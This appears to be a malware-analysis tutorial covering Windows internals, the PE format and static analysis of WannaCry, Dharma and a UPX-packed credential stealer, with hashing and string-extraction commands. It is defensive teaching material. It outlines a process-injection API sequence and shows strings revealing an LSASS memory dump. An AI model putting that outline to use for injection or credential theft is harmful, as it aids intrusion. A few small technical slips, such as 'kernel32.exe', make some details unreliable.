In today's ever-evolving threat landscape, the usage of malware analysis plays a pivotal role in our cybersecurity defense strategies. As cyber threats become increasingly sophisticated, we must continually enhance our capabilities to identify, analyze, and mitigate the risks posed by malicious software.

Through malware analysis, we gain invaluable insights into the nature of the threats we face. Understanding the malware's specific attributes allows us to tailor our response tactics accordingly, addressing each threat with precision.

### Windows Internals


To conduct effective malware analysis, a profound understanding of Windows internals is essential. Windows operating systems function in two main modes:

**User Mode:** This mode is where most applications and user processes operate. Applications in user mode have limited access to system resources and must interact with the operating system through Application Programming Interfaces (APIs). These processes are isolated from each other and cannot directly access hardware or critical system functions. However, in this mode, malware can still manipulate files, registry settings, network connections, and other user-accessible resources, and it may attempt to escalate privileges to gain more control over the system.

**Kernel Mode:** In contrast, kernel mode is a highly privileged mode where the Windows kernel runs. The kernel has unrestricted access to system resources, hardware, and critical functions. It provides core operating system services, manages system resources, and enforces security and stability. Device drivers, which facilitate communication with hardware devices, also run in kernel mode. If malware operates in kernel mode, it gains elevated control and can manipulate system behavior, conceal its presence, intercept system calls, and tamper with security mechanisms.


### Windows Architecture At A High Level


The below image showcases a simplified version of Windows' architecture.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4d85570d-cb81-4516-9a66-08b7e1193a02)


The simplified Windows architecture comprises both user-mode and kernel-mode components, each with distinct responsibilities in the system's functioning.


### User-mode Components

User-mode components are those parts of the operating system that don't have direct access to hardware or kernel data structures. They interact with system resources through APIs and system calls. Let's discuss some of them:

- System Support Processes: These are essential components that provide crucial functionalities and services such as logon processes (winlogon.exe), Session Manager (smss.exe), and Service Control Manager (services.exe). These aren't Windows services but they are necessary for the proper functioning of the system.

-  Service Processes: These processes host Windows services like the Windows Update Service, Task Scheduler, and Print Spooler services. They usually run in the background, executing tasks according to their configuration and parameters.

-  User Applications: These are the processes created by user programs, including both 32-bit and 64-bit applications. They interact with the operating system through APIs provided by Windows. These API calls get redirected to NTDLL.DLL, triggering a transition from user mode to kernel mode, where the system call gets executed. The result is then returned to the user-mode application, and a transition back to user mode occurs.

- Environment Subsystems: These components are responsible for providing execution environments for specific types of applications or processes. They include the Win32 Subsystem, POSIX, and OS/2.

Subsystem DLLs: These dynamic-link libraries translate documented functions into appropriate internal native system calls, primarily implemented in NTDLL.DLL. Examples include kernelbase.dll, user32.dll, wininet.dll, and advapi32.dll.

### Kernel-mode Components

Kernel-mode components are those parts of the operating system that have direct access to hardware and kernel data structures. These include:

- Executive: This upper layer in kernel mode gets accessed through functions from NTDLL.DLL. It consists of components like the I/O Manager, Object Manager, Security Reference Monitor, Process Manager, and others, managing the core aspects of the operating system such as I/O operations, object management, security, and processes. It runs some checks first, and then passes the call to kernel, or calls the appropriate device driver to perform the requested operation.

- Kernel: This component manages system resources, providing low-level services like thread scheduling, interrupt and exception dispatching, and multiprocessor synchronization.

- Device Drivers: These software components enable the OS to interact with hardware devices. They serve as intermediaries, allowing the system to manage and control hardware and software resources.

- Hardware Abstraction Layer (HAL): This component provides an abstraction layer between the hardware devices and the OS. It allows software developers to interact with hardware in a consistent and platform-independent manner.

- Windowing and Graphics System (Win32k.sys): This subsystem is responsible for managing the graphical user interface (GUI) and rendering visual elements on the screen.

Now, let's discuss in what happens behind the scenes when an user application calls a Windows API function.


### Windows API Call Flow

Malware often utilize Windows API calls to interact with the system and carry out malicious operations. By understanding the internal details of API functions, their parameters, and expected behavior, analysts can identify suspicious or unauthorized API usage.

Let's consider an example of a Windows API call flow, where a user-mode application tries to access privileged operations and system resources using the ReadProcessMemory function. This function allows a process to read the memory of a different process.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/1842f297-aca9-454b-89ff-21c3aa80692d)


When this function is called, some required parameters are also passed to it, such as the handle to the target process, the source address to read from, a buffer in its own memory space to store the read data, and the number of bytes to read. Below is the syntax of ReadProcessMemory WINAPI function as per Microsoft documentation.


```
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
);
```

ReadProcessMemory is a Windows API function that belongs to the kernel32.dll library. So, this call is invoked via the kernel32.dll module which serves as the user mode interface to the Windows API. Internally, the kernel32.dll module interacts with the NTDLL.DLL module, which provides a lower-level interface to the Windows kernel. Then, this function request is translated to the corresponding Native API call, which is NtReadVirtualMemory. The below screenshot from x64dbg demonstrates how this looks like in a debugger.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b6a1c4db-da8b-44c5-b47e-918097aa7534)

The NTDLL.DLL module utilizes system calls (syscalls).

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c7563745-4180-4b74-994a-15672b52e1a8)


The syscall instruction triggers the system call using the parameters set in the previous instructions. It transfers control from user mode to kernel mode, where the kernel performs the requested operation after validating the parameters and checking the access rights of the calling process.

If the request is authorized, the thread is transitioned from user mode into the kernel mode. The kernel maintains a table known as the System Service Descriptor Table (SSDT) or the syscall table (System Call Table), which is a data structure that contains pointers to the various system service routines. These routines are responsible for handling system calls made by user-mode applications. Each entry in the syscall table corresponds to a specific system call number, and the associated pointer points to the corresponding kernel function that implements the requested operation.

The syscall responsible for ReadProcessMemory is executed in the kernel, where the Windows memory management and process isolation mechanisms are leveraged. The kernel performs necessary validations, access checks, and memory operations to read the memory from the target process. The kernel retrieves the physical memory pages corresponding to the requested virtual addresses and copies the data into the provided buffer.

Once the kernel has finished reading the memory, it transitions the thread back to user mode and control is handed back to the original user mode application. The application can then access the data that was read from the target process's memory and continue its execution.

## Portable Executable

Windows operating systems employ the Portable Executable (PE) format to encapsulate executable programs, DLLs (Dynamic Link Libraries), and other integral system components. In the realm of malware analysis, an intricate understanding of the PE file format is indispensable. It allows us to gain significant insights into the executable's structure, operations, and potential malign activities embedded within the file.

PE files accommodate a wide variety of data types including executables (.exe), dynamic link libraries (.dll), kernel modules (.srv), control panel applications (.cpl), and many more. The PE file format is fundamentally a data structure containing the vital information required for the Windows OS loader to manage the executable code, effectively loading it into memory.

### PE Sections

The PE Structure also houses a Section Table, an element comprising several sections dedicated to distinct purposes. The sections are essentially the repositories where the actual content of the file, including the data, resources utilized by the program, and the executable code, is stored. The .text section is often under scrutiny for potential artifacts related to injection attacks.

**Common PE sections include:**

- Text Section (.text): The hub where the executable code of the program resides.
- Data Section (.data): A storage for initialized global and static data variables.
- Read-only initialized data (.rdata): Houses read-only data such as constant values, string literals, and initialized global and static variables.
- Exception information (.pdata): A collection of function table entries utilized for exception handling.
- BSS Section (.bss): Holds uninitialized global and static data variables.
- Resource Section (.rsrc): Safeguards resources such as images, icons, strings, and version information.
- Import Section (.idata): Details about functions imported from other DLLs.
- Export Section (.edata): Information about functions exported by the executable.
- Relocation Section (.reloc): Details for relocating the executable's code and data when loaded at a different memory address.

**We can visualize the sections of a portable executable using a tool like pestudio as demonstrated below.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/ebf5e21c-4914-4009-9988-069b6a4cfef9)

Delving into the Portable Executable (PE) file format is pivotal for malware analysis, offering insights into the file's structure, code analysis, import and export functions, resource analysis, anti-analysis techniques, and extraction of indicators of compromise. Our comprehension of this foundation paves the way for efficacious malware analysis.

**Processes**

In the simplest terms, a process is an instance of an executing program. It represents a slice of a program's execution in memory and consists of various resources, including memory, file handles, threads, and security contexts.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6410d46f-e253-4f51-822c-2550b413b82b)

**Each process is characterized by:**

- A unique PID (Process Identifier): A unique Process Identifier (PID) is assigned to each process within the operating system. This numeric identifier facilitates the tracking and management of the process by the operating system.

- Virtual Address Space (VAS): In the Windows OS, every process is allocated its own virtual address space, offering a virtualized view of the memory for the process. The VAS is sectioned into segments, including code, data, and stack segments, allowing the process isolated memory access.

- Executable Code (Image File on Disk): The executable code, or the image file, signifies the binary executable file stored on the disk. It houses the instructions and resources necessary for the process to operate.

- Table of Handles to System Objects: Processes maintain a table of handles, a reference catalogue for various system objects. System objects can span files, devices, registry keys, synchronization objects, and other resources.

- Security Context (Access Token): Each process has a security context associated with it, embodied by an Access Token. This Access Token encapsulates information about the process's security privileges, including the user account under which the process operates and the access rights granted to the process.

- One or More Threads Running in its Context: Processes consist of one or more threads, where a thread embodies a unit of execution within the process. Threads enable concurrent execution within the process and facilitate multitasking.

**Dynamic-link library (DLL)**

A Dynamic-link library (DLL) is a type of PE which represents "Microsoft's implementation of the shared library concept in the Microsoft Windows OS". DLLs expose an array of functions which can be exploited by malware, which we’ll scrutinize later. First, let's unravel the import and export functions in a DLL.

**Import Functions**

- Import functions are functionalities that a binary dynamically links to from external libraries or modules during runtime. These functions enable the binary to leverage the functionalities offered by these libraries.

- During malware analysis, examining import functions may shed light on the external libraries or modules that the malware is dependent on. This information aids in identifying the APIs that the malware might interact with, and also the resources such as the file system, processes, registry etc.

- By identifying specific functions imported, it becomes possible to ascertain the actions the malware can perform, such as file operations, network communication, registry manipulation, and more.

- Import function names or hashes can serve as IOCs (Indicators of Compromise) that assist in identifying malware variants or related samples.

**Below is an example of identifying process injection using DLL imports and function names:**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d0c00c07-f2bf-4014-a72f-73dbb98345a7)


In this diagram, the malware process (shell.exe) performs process injection to inject code into a target process (notepad.exe) using the following functions imported from the DLL kernel32.exe:


- OpenProcess: Opens a handle to the target process (notepad.exe), providing the necessary access rights to manipulate its memory.
- VirtualAllocEx: Allocates a block of memory within the address space of the target process to store the injected code.
- WriteProcessMemory: Writes the desired code into the allocated memory block of the target process.
- CreateRemoteThread: Creates a new thread within the target process, specifying the entry point of the injected code as the starting point.


As a result, the injected code is executed within the context of the target process by the newly created remote thread. This technique allows the malware to run arbitrary code within the target process.

The functions above are WINAPI (Windows API) functions. Don't worry about WINAPI functions as of now. We'll discuss these in detail later.

We can examine the DLL imports of shell.exe (residing in the C:\Samples\MalwareAnalysis directory) using CFF Explorer (available at C:\Tools\Explorer Suite) as follows.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/96a790d4-1bfb-4552-9fd4-33998b574771)

### Export Functions

- Export functions are the functions that a binary exposes for use by other modules or applications.

- These functions provide an interface for other software to interact with the binary.

In the below screenshot, we can see an example of DLL imports (using CFF Explorer) and exports (using x64dbg - Symbols tab):

- Imports: This shows the DLLs and their functions imported by an executable Utilman.exe.

- Exports: This shows the functions exported by a DLL Kernel32.dll.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a7599f4d-a932-46b5-ae3b-88ecce2db485)

# Static Analysis On Linux

In the realm of malware analysis, we exercise a method called static analysis to scrutinize malware without necessitating its execution. This involves the meticulous investigation of malware's code, data, and structural components, serving as a vital precursor for further, more detailed analysis.

**Through static analysis, we endeavor to extract pivotal information which includes:**

- File type
- File hash
- Strings
- Embedded elements
- Packer information
- Imports
- Exports
- Assembly code

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7c0affe7-c729-4777-bc6b-1593165535a6)


### Identifying The File Type


Our first port of call in this stage is to ascertain the rudimentary information about the malware specimen to lay the groundwork for our investigation. Given that file extensions can be manipulated and changed, our task is to devise a method to identify the actual file type we are encountering. Establishing the file type plays an integral role in static analysis, ensuring that the procedures we apply are appropriate and the results obtained are accurate.

**Let's use a Windows-based malware named Ransomware.wannacry.exe residing in the /home/htb-student/Samples/MalwareAnalysis directory of this section's target as an illustration.**

**The command for checking the file type of this malware would be the following.**


We can also do the same by manually checking the header with the help of the hexdump command as follows.


```
$ hexdump -C /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe | more
00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|
00000010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 f8 00 00 00  |................|
00000040  0e 1f ba 0e 00 b4 09 cd  21 b8 01 4c cd 21 54 68  |........!..L.!Th|
00000050  69 73 20 70 72 6f 67 72  61 6d 20 63 61 6e 6e 6f  |is program canno|
00000060  74 20 62 65 20 72 75 6e  20 69 6e 20 44 4f 53 20  |t be run in DOS |
00000070  6d 6f 64 65 2e 0d 0d 0a  24 00 00 00 00 00 00 00  |mode....$.......|
00000080  55 3c 53 90 11 5d 3d c3  11 5d 3d c3 11 5d 3d c3  |U<S..]=..]=..]=.|
00000090  6a 41 31 c3 10 5d 3d c3  92 41 33 c3 15 5d 3d c3  |jA1..]=..A3..]=.|
000000a0  7e 42 37 c3 1a 5d 3d c3  7e 42 36 c3 10 5d 3d c3  |~B7..]=.~B6..]=.|
000000b0  7e 42 39 c3 15 5d 3d c3  d2 52 60 c3 1a 5d 3d c3  |~B9..]=..R`..]=.|
000000c0  11 5d 3c c3 4a 5d 3d c3  27 7b 36 c3 10 5d 3d c3  |.]<.J]=.'{6..]=.|
000000d0  d6 5b 3b c3 10 5d 3d c3  52 69 63 68 11 5d 3d c3  |.[;..]=.Rich.]=.|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  00 00 00 00 00 00 00 00  50 45 00 00 4c 01 04 00  |........PE..L...|
00000100  cc 8e e7 4c 00 00 00 00  00 00 00 00 e0 00 0f 01  |...L............|
00000110  0b 01 06 00 00 90 00 00  00 30 38 00 00 00 00 00  |.........08.....|
00000120  16 9a 00 00 00 10 00 00  00 a0 00 00 00 00 40 00  |..............@.|
00000130  00 10 00 00 00 10 00 00  04 00 00 00 00 00 00 00  |................|
00000140  04 00 00 00 00 00 00 00  00 b0 66 00 00 10 00 00  |..........f.....|
00000150  00 00 00 00 02 00 00 00  00 00 10 00 00 10 00 00  |................|
00000160  00 00 10 00 00 10 00 00  00 00 00 00 10 00 00 00  |................|
00000170  00 00 00 00 00 00 00 00  e0 a1 00 00 a0 00 00 00  |................|
00000180  00 00 31 00 54 a4 35 00  00 00 00 00 00 00 00 00  |..1.T.5.........|
00000190  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
```

On a Windows system, the presence of the ASCII string MZ (in hexadecimal: 4D 5A) at the start of a file (known as the "magic number") denotes an executable file. MZ stands for Mark Zbikowski, a key architect of MS-DOS.

### Malware Fingerprinting

In this stage, our mission is to create a unique identifier for the malware sample. This typically takes the form of a cryptographic hash - MD5, SHA1, or SHA256.

**Fingerprinting is employed for numerous purposes, encompassing:**

- Identification and tracking of malware samples
- Scanning an entire system for the presence of identical malware
- Confirmation of previous encounters and analyses of the same malware
- Sharing with stakeholders as IoC (Indicators of Compromise) or as part of threat intelligence reports

**As an illustration, to check the MD5 file hash of the abovementioned malware the command would be the following.**

```
$ md5sum /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
db349b97c37d22f5ea1d1841e3c89eb4  /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
```
To check the SHA256 file hash of the abovementioned malware the command would be the following.

```
$ sha256sum /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c  /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
```

### File Hash Lookup


The ensuing step involves checking the file hash produced in the prior step against online malware scanners and sandboxes such as Cuckoo sandbox. For instance, VirusTotal, an online malware scanning engine, which collaborates with various antivirus vendors, allows us to search for the file hash. This step aids us in comparing our results with existing knowledge about the malware sample.

The following image displays the results from VirusTotal after the SHA256 file hash of the aforementioned malware was submitted.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/3c714490-d664-4459-a33e-7177e5c7042f)


Even though a file hash like MD5, SHA1, or SHA256 is valuable for identifying identical samples with disparate names, it falls short when identifying similar malware samples. This is primarily because a malware author can alter the file hash value by making minor modifications to the code and recompiling it.

**Nonetheless, there exist techniques that can aid in identifying similar samples:**


### Import Hashing (IMPHASH)

IMPHASH, an abbreviation for "Import Hash", is a cryptographic hash calculated from the import functions of a Windows Portable Executable (PE) file. Its algorithm functions by first converting all imported function names to lowercase. Following this, the DLL names and function names are fused together and arranged in alphabetical order. Finally, an MD5 hash is generated from the resulting string. Therefore, two PE files with identical import functions, in the same sequence, will share an IMPHASH value.

**We can find the IMPHASH in the Details tab of the VirusTotal results.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/06b6e93c-1048-4303-bd87-70bc81e8f352)


**Note that we can also use the pefile Python module to compute the IMPHASH of a file as follows.**

```
import sys
import pefile
import peutils

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
imphash = pe.get_imphash()

print(imphash)
```
**To check the IMPHASH of the abovementioned WannaCry malware the command would be the following. imphash_calc.py (available at /home/htb-student) contains the Python code above.**

```
$ python3 imphash_calc.py /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
9ecee117164e0b870a53dd187cdd7174
```
### Fuzzy Hashing (SSDEEP)

**Fuzzy Hashing (SSDEEP)**, also referred to as context-triggered piecewise hashing (CTPH), is a hashing technique designed to compute a hash value indicative of content similarity between two files. This technique dissects a file into smaller, fixed-size blocks and calculates a hash for each block. The resulting hash values are then consolidated to generate the final fuzzy hash.

The SSDEEP algorithm allocates more weight to longer sequences of common blocks, making it highly effective in identifying files that have undergone minor modifications, or are similar but not identical, such as different variations of a malicious sample.

**We can find the SSDEEP hash of a malware in the Details tab of the VirusTotal results.**

We can also use the ssdeep command to calculate the SSDEEP hash of a file. To check the SSDEEP hash of the abovementioned WannaCry malware the command would be the following.

```
$ ssdeep /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
ssdeep,1.1--blocksize:hash:hash,filename
98304:wDqPoBhz1aRxcSUDk36SAEdhvxWa9P593R8yAVp2g3R:wDqPe1Cxcxk3ZAEUadzR8yc4gB,"/home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe"
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/34adcb24-1118-46de-ad57-2b0cd8671d9e)

The command line arguments -pb can be used to initiate matching mode in SSDEEP (while we are on the directory where the malware samples are stored - /home/htb-student/Samples/MalwareAnalysis in our case).

```
$ ssdeep -pb *
potato.exe matches svchost.exe (99)

svchost.exe matches potato.exe (99)
```

-p denotes Pretty matching mode, and -b is used to display only the file names, sans the full path.

In the example above, a 99% similarity was observed between two malware samples (svchost.exe and potato.exe) using SSDEEP.


### Section Hashing (Hashing PE Sections)

Section hashing, (hashing PE sections) is a powerful technique that allows analysts to identify sections of a Portable Executable (PE) file that have been modified. This can be particularly useful for identifying minor variations in malware samples, a common tactic employed by attackers to evade detection.

The Section Hashing technique works by calculating the cryptographic hash of each of these sections. When comparing two PE files, if the hash of corresponding sections in the two files matches, it suggests that the particular section has not been modified between the two versions of the file.

By applying section hashing, security analysts can identify parts of a PE file that have been tampered with or altered. This can help identify similar malware samples, even if they have been slightly modified to evade traditional signature-based detection methods.

**Tools such as pefile in Python can be used to perform section hashing. In Python, for example, you can use the pefile module to access and hash the data in individual sections of a PE file as follows.**

```
import sys
import pefile
pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print (section.Name, "MD5 hash:", section.get_hash_md5())
    print (section.Name, "SHA256 hash:", section.get_hash_sha256())
```

Remember that while section hashing is a powerful technique, it is not foolproof. Malware authors might employ tactics like section name obfuscation or dynamically generating section names to try and bypass this kind of analysis.

As an illustration, to check the MD5 and SHA256 PE section hashes of a Wannacry executable stored in the /home/htb-student/Samples/MalwareAnalysis directory, the command would be the following. section_hashing.py (available at /home/htb-student) contains the Python code above.


```
Static Analysis On Linux

$ python3 section_hashing.py /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe
b'.text\x00\x00\x00' MD5 hash: c7613102e2ecec5dcefc144f83189153
b'.text\x00\x00\x00' SHA256 hash: 7609ecc798a357dd1a2f0134f9a6ea06511a8885ec322c7acd0d84c569398678
b'.rdata\x00\x00' MD5 hash: d8037d744b539326c06e897625751cc9
b'.rdata\x00\x00' SHA256 hash: 532e9419f23eaf5eb0e8828b211a7164cbf80ad54461bc748c1ec2349552e6a2
b'.data\x00\x00\x00' MD5 hash: 22a8598dc29cad7078c291e94612ce26
b'.data\x00\x00\x00' SHA256 hash: 6f93fb1b241a990ecc281f9c782f0da471628f6068925aaf580c1b1de86bce8a
b'.rsrc\x00\x00\x00' MD5 hash: 12e1bd7375d82cca3a51ca48fe22d1a9
b'.rsrc\x00\x00\x00' SHA256 hash: 1efe677209c1284357ef0c7996a1318b7de3836dfb11f97d85335d6d3b8a8e42

```

# String Analysis

In this phase, our objective is to extract strings (ASCII & Unicode) from a binary. Strings can furnish clues and valuable insight into the functionality of the malware. Occasionally, we can unearth unique embedded strings in a malware sample, such as:

- Embedded filenames (e.g., dropped files)
- IP addresses or domain names
- Registry paths or keys
- Windows API functions
- Command-line arguments
- Unique information that might hint at a particular threat actor

The Linux strings command can be deployed to display the strings contained within a malware. For instance, the command below will reveal strings for a ransomware sample named dharma_sample.exe residing in the /home/htb-student/Samples/MalwareAnalysis directory of this section's target.

```
$ strings -n 15 /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe
!This program cannot be run in DOS mode.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@
!"#$%&'()*+,-./0123@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
WaitForSingleObject
InitializeCriticalSectionAndSpinCount
LeaveCriticalSection
EnterCriticalSection
C:\crysis\Release\PDB\payload.pdb
0123456789ABCDEF
```

**-n specifies to print a sequence of at least the number specified - in our case, 15.**

Occasionally, string analysis can facilitate the linkage of a malware sample to a specific threat group if significant similarities are identified. For example, in the link provided, a string containing a PDB path was used to link the malware sample to the Dharma/Crysis family of ransomware.

It should be noted that another string analysis solution exists called FLOSS. FLOSS, short for "FireEye Labs Obfuscated String Solver", is a tool developed by FireEye's FLARE team to automatically deobfuscate strings in malware. It's designed to supplement the use of traditional string tools, like the strings command in Unix-based systems, which can miss obfuscated strings that are commonly used by malware to evade detection.

**For instance, the command below will reveal strings for a ransomware sample named dharma_sample.exe residing in the /home/htb-student/Samples/MalwareAnalysis directory of this section's target.**

```
$ floss /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe
INFO: floss: extracting static strings...
finding decoding function features: 100%|███████████████████████████████████████| 238/238 [00:00<00:00, 838.37 functions/s, skipped 5 library functions (2%)]
INFO: floss.stackstrings: extracting stackstrings from 223 functions
INFO: floss.results: %sh(
extracting stackstrings: 100%|████████████████████████████████████████████████████████████████████████████████████| 223/223 [00:01<00:00, 133.51 functions/s]
INFO: floss.tightstrings: extracting tightstrings from 10 functions...
extracting tightstrings from function 0x4065e0: 100%|████████████████████████████████████████████████████████████████| 10/10 [00:01<00:00,  5.91 functions/s]
INFO: floss.string_decoder: decoding strings
INFO: floss.results: EEED
INFO: floss.results: EEEDnnn
INFO: floss.results: uOKm
INFO: floss.results: %sh(
INFO: floss.results: uBIA
INFO: floss.results: uBIA
INFO: floss.results: \t\t\t\t\t\t\t\t
emulating function 0x405840 (call 4/9): 100%|████████████████████████████████████████████████████████████████████████| 25/25 [00:11<00:00,  2.19 functions/s]
INFO: floss: finished execution after 23.56 seconds

FLARE FLOSS RESULTS (version v2.0.0-0-gdd9bea8)
+------------------------+------------------------------------------------------------------------------------+
| file path              | /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe                        |
| extracted strings      |                                                                                    |
|  static strings        | 720                                                                                |
|  stack strings         | 1                                                                                  |
|  tight strings         | 0                                                                                  |
|  decoded strings       | 7                                                                                  |
+------------------------+------------------------------------------------------------------------------------+

------------------------------
| FLOSS STATIC STRINGS (720) |
------------------------------
-----------------------------
| FLOSS ASCII STRINGS (716) |
-----------------------------
!This program cannot be run in DOS mode.
Rich
.text
`.rdata
@.data
9A s
9A$v
A +B$
---SNIP---
+o*7
0123456789ABCDEF

------------------------------
| FLOSS UTF-16LE STRINGS (4) |
------------------------------
jjjj
%sh(
ssbss
0123456789ABCDEF

---------------------------
| FLOSS STACK STRINGS (1) |
---------------------------
%sh(

---------------------------
| FLOSS TIGHT STRINGS (0) |
---------------------------

-----------------------------
| FLOSS DECODED STRINGS (7) |
-----------------------------
EEED
EEEDnnn
uOKm
%sh(
uBIA
uBIA
\t\t\t\t\t\t\t\t
```

### Unpacking UPX-packed Malware

In our static analysis, we might stumble upon a malware sample that's been compressed or obfuscated using a technique referred to as packing. Packing serves several purposes:

- It obfuscates the code, making it more challenging to discern its structure or functionality.
- It reduces the size of the executable, making it quicker to transfer or less conspicuous.
- It confounds security researchers by hindering traditional reverse engineering attempts.

This can impair string analysis because the references to strings are typically obscured or eliminated. It also replaces or camouflages conventional PE sections with a compact loader stub, which retrieves the original code from a compressed data section. As a result, the malware file becomes both smaller and more difficult to analyze, as the original code isn't directly observable.

A popular packer used in many malware variants is the Ultimate Packer for Executables (UPX).

Let's first see what happens when we run the strings command on a UPX-packed malware sample named credential_stealer.exe residing in the /home/htb-student/Samples/MalwareAnalysis/packed directory of this section's target.

```
$ strings /home/htb-student/Samples/MalwareAnalysis/packed/credential_stealer.exe
!This program cannot be run in DOS mode.
UPX0
UPX1
UPX2
3.96
UPX!
8MZu
HcP<H
VDgxt
$ /uX
OAUATUWVSH
%0rv
o?H9
c`fG
[^_]A\A]
> -P
        fo{Wnl
c9"^$!=
v/7>
07ZC
_L$AAl
mug.%(
#8%,X
e]'^
---SNIP---
```

Observe the strings that include UPX, and take note that the remainder of the output doesn't yield any valuable information regarding the functionality of the malware.

We can unpack the malware using the UPX tool with the following command (while we are on the directory where the packed malware samples are stored - /home/htb-student/Samples/MalwareAnalysis/packed in our case).

```
$ upx -d -o unpacked_credential_stealer.exe credential_stealer.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     16896 <-      8704   51.52%    win64/pe     unpacked_credential_stealer.exe

Unpacked 1 file.
```

**Let's now run the strings command on the unpacked sample.**

```
$ strings unpacked_credential_stealer.exe
!This program cannot be run in DOS mode.
.text
P`.data
.rdata
`@.pdata
0@.xdata
0@.bss
.idata
.CRT
.tls
---SNIP---
AVAUATH
@A\A]A^
SeDebugPrivilege
SE Debug Privilege is adjusted
lsass.exe
Searching lsass PID
Lsass PID is: %lu
Error is - %lu
lsassmem.dmp
LSASS Memory is dumped successfully
Err 2: %lu
Unknown error
Argument domain error (DOMAIN)
Overflow range error (OVERFLOW)
Partial loss of significance (PLOSS)
Total loss of significance (TLOSS)
The result is too small to be represented (UNDERFLOW)
Argument singularity (SIGN)
_matherr(): %s in %s(%g, %g)  (retval=%g)
Mingw-w64 runtime failure:
Address %p has no image-section
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
.pdata
AdjustTokenPrivileges
LookupPrivilegeValueA
OpenProcessToken
MiniDumpWriteDump
CloseHandle
CreateFileA
CreateToolhelp32Snapshot
DeleteCriticalSection
EnterCriticalSection
GetCurrentProcess
GetCurrentProcessId
GetCurrentThreadId
GetLastError
GetStartupInfoA
GetSystemTimeAsFileTime
GetTickCount
InitializeCriticalSection
LeaveCriticalSection
OpenProcess
Process32First
Process32Next
QueryPerformanceCounter
RtlAddFunctionTable
RtlCaptureContext
RtlLookupFunctionEntry
RtlVirtualUnwind
SetUnhandledExceptionFilter
Sleep
TerminateProcess
TlsGetValue
UnhandledExceptionFilter
VirtualProtect
VirtualQuery
__C_specific_handler
__getmainargs
__initenv
__iob_func
__lconv_init
__set_app_type
__setusermatherr
_acmdln
_amsg_exit
_cexit
_fmode
_initterm
_onexit
abort
calloc
exit
fprintf
free
fwrite
malloc
memcpy
printf
puts
signal
strcmp
strlen
strncmp
vfprintf
ADVAPI32.dll
dbghelp.dll
KERNEL32.DLL
msvcrt.dll
```

# Static Analysis On Windows

In this segment, our focus will be on reproducing some of the static analysis tasks we carried out on a Linux machine, but this time, we'll be employing a Windows machine.

## Identifying The File Type

Our first port of call in this stage is to ascertain the rudimentary information about the malware specimen to lay the groundwork for our investigation. Given that file extensions can be manipulated and changed, our task is to devise a method to identify the actual file type we are encountering. Establishing the file type plays an integral role in static analysis, ensuring that the procedures we apply are appropriate and the results obtained are accurate.

Let's use a Windows-based malware named Ransomware.wannacry.exe residing in the C:\Samples\MalwareAnalysis directory of this section's target as an illustration.

**We can use a solution like CFF Explorer (available at C:\Tools\Explorer Suite) to check the file type of this malware as follows.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a01684c8-594b-48ab-b097-9b842ba27197)


On a Windows system, the presence of the ASCII string MZ (in hexadecimal: 4D 5A) at the start of a file (known as the "magic number") denotes an executable file. MZ stands for Mark Zbikowski, a key architect of MS-DOS.


